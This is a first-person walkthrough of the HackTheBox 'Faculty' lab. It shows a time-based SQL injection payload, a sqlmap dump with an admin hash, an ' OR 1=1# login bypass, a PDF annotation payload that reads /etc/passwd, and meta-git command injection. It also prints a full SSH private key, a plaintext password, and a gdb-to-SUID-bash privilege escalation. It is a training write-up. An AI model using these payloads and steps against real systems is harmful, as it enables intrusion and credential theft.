# Faculty

## User Flag

Immediately after adding faculty.htb to my notes, I immediatly tried accessing a webpage and was greeted with a login page right away.

After performing a quick nmap scan, I found that it has an open port on 22 and 80.

The /login.php page presents us with an option to input a faculty id number. When inputing a number it simply sends a POST request in the form of form data.

Next I'm going to open the request in Burp Suite and work from there.

But before I do that, I should get a good understanding of the systems I'm breaking into.

### Fuzzing Directories

Next, I fuzzed the web directories to see what I could make out of them.

```
ffuf -u http://faculty.htb/FUZZ -w directory-list-1.0.txt
```

The directory I pulled back was: /admin/

Accessing http://faculty.htb/admin/ presented me with a dashboard for a college. I was currently logged in as user 27, which I'm not quite sure why.

Poking around, there is potential for LFI as well as a logout box which will allow you to login as other users.

### SQL Injections

Looks like it responded to a basic ' SQLi payload. So I'm going to manually try with some other payloads until I get a hit.

Eventually I got one, I know it succeeded because it ran SLEEP(5) and caused the server to delay for 5 seconds.

```
id_no=2100935'+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)+AND+'1'='1
```

Afterward, I saved my successful request and shoved it into sqlmap. Which I am hoping will give me a table dump.

```
sqlmap -r request.req
```

Notably I retrieved a database called scheduling_db.

It contains 6 tables inside.

* scheduling_db
	* class_schedule_info
	* courses
	* faculty
	* schedules
	* subjects
		* id
		* subject
		* description
	* users

We were also able to gain an admin password hash as well as some ids.
```
admin:1fecbe762af147c1176a0fc2c722a345

id | id_no
1	63033226
2	85662050
3	30903070
```

Turns out we can use these id numbers to log into the system without any other need for credentials!

It should also be noted that the admin login page on /admin/ can be bypassed with a simple SQL injection.

```
' OR 1=1#
poop
```

### Admin Dashboard

After poking around with burp proxy, I found some interesting results especially stemming from one particular piece of functionality: the pdf download button.

As part of the POST request, it sends in a chunk of base64 encoded data.

After fiddling around with it in the Burp decoder, I found out that it's encoded with base64 then url encoding (which I found some readable characters in) then url encoding again.

From there, you can dig up some unique html.

I used this website to beautify it: https://www.freeformatter.com/html-formatter.html

The most interesting line to me was this guy:

```
<annotation file="/etc/passwd" content="/etc/passwd"  icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

Now using that payload and replacing the original payload with it (and exploiting other pages), we can find the following credentials:

```
gbyolo:Co.met06aci.dly53ro.per
```

That in turn allows me to login as the user. But the user flag isn't inside of gbyolo's home.

### Securing the first flag

Immediately I tried running sudo -l inside of it and after putting in gbyolo's password, I found that meta-git can run on sudo without a password.

With this, I found this bug report online that helps me do RCE: https://hackerone.com/reports/728040

So I ran the following: 

```
sudo -u developer meta-git clone 'piss | ls /home/developer'
```

That shows the following files are in the developer's directory:

**sendmail.sh  user.txt**

So now I'm going to cat it.

```
sudo -u developer meta-git clone 'piss | cat /home/developer/user.txt'
```

That gave me the first flag!!

## Root Flag

### Developer

First things first, we should get into the developer user before proceeding.

So initially, I tried to drop a bash shell as developer but that didn't work so instead I scouted around for ssh keys. Then I found one.

```
sudo -u developer meta-git clone 'piss | ls -la /home/developer/.ssh/'
sudo -u developer meta-git clone 'piss | cat /home/developer/.ssh/id_rsa'
```

That dropped this bad boi:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

So I copied that into a pivate ssh key.

```
sudo chmod 400 faculty
ssh developer@10.10.11.169 -i faculty
```

Now we're in!

### Secure Root Flag

First, I ran linpeas and found that developer can read some root files due to being in the debug group.

```
/usr/bin/gdb
/home/developer/user.txt
```

We already got the user.txt flag, so let's check out the gdb. So I jumped over to GTFO bins and searched for the gdb.

I first tried this:

```
gdb -nx -ex '!sh' -ex quit
```

But that just spawned a shell in developer which didn't help me at all. Oops.

Next, I found an article detailing running gdb on processes and using that to escalate privilages: https://meowmeowattack.wordpress.com/2022/07/07/ctf-write-up-hackthebox-htb-faculty/

So next I did the following, I first looked for any processes root might be running that I could use. Found one for python3.

```
ps aux | grep python3
```

I found it running on process 733.

So next I ran process 733 in gdb.

```
gdb -p 733
```

First I tried the "ls" command inside gdb and it seemed to run it just fine.

```
(gdb) call (void)system("ls")
[Detaching after vfork from child process 47153]
```

So what if I tied higher permissions to a bash shell to myself?

```
(gdb) call (void)system("chmod +s /bin/bash")
[Detaching after vfork from child process 47331]
```

Then after exiting gdb, I ran the shell myself.

```
bash -p
id
uid=1001(developer) gid=1002(developer) euid=0(root) egid=0(root) groups=0(root),1001(debug),1002(developer),1003(faculty)
```

That's when I finally secured the flag in my new shell.

```
cat /root/root.txt
```

Holy HECK that one was ROUGH. Not going to lie though, root was WAY easier than user.
